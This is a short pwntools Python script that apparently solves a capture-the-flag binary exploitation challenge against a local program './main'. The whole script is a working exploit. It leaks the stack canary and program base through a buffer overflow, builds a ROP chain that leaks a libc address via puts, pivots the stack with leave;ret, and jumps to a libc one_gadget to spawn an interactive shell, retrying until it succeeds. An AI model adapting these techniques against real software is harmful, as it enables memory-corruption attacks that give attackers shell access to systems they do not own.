from pwn import*
elf =ELF('./main')
#libc =ELF('./libc-2.30.so')
libc =ELF('./libc-2.23.so')
while True:
	p = process('./main')
	try:
		p.sendafter("please!","A"*0x25 + 'BBBB')
		p.recvuntil('BBBB')
		canary = u64('\x00' + p.recv(7))
		log.info('Canary:\t' + hex(canary))
		proc_base = u64(p.recv(6).ljust(8,'\x00')) - 0x14C0 - 0x50
		log.info('Proc:\t' + hex(proc_base))
		p.sendlineafter('want to do','PlaytheCTF')
		p.sendlineafter('message?',str(0x70))
		pop_rdi_ret = proc_base + 0x156B
		pop_rbp_ret = proc_base + 0x11AF
		leave_ret = proc_base + 0x1262
		rop  = p64(canary) + p64(0)
		rop += p64(pop_rdi_ret) + p64(proc_base + elf.got['puts']) + p64(proc_base + elf.plt['puts'])
		rop += p64(pop_rdi_ret) + p64(proc_base + elf.bss() + 0x50) + p64(proc_base + 0x11C5)
		rop += p64(pop_rbp_ret) + p64(proc_base + elf.bss() + 0x50 - 8) + p64(leave_ret)
		rop  = rop.ljust(0x60,'\x00')
		rop += '\x00'*8 + p64(canary)
		rop += '\x48'
		p.sendafter('message to me',rop)
		libc_base = u64(p.recvuntil('\x7F')[-6:].ljust(8,'\x00')) - libc.sym['puts']
		log.info('LIBC:\t' + hex(libc_base))
		#p.sendline(p64(libc_base + 0x10AFA9) + '\x00'*0x100)
		p.sendline(p64(libc_base + 0xF1207) + '\x00'*0x100)
		break
	except:
		p.close()
		continue
p.interactive()
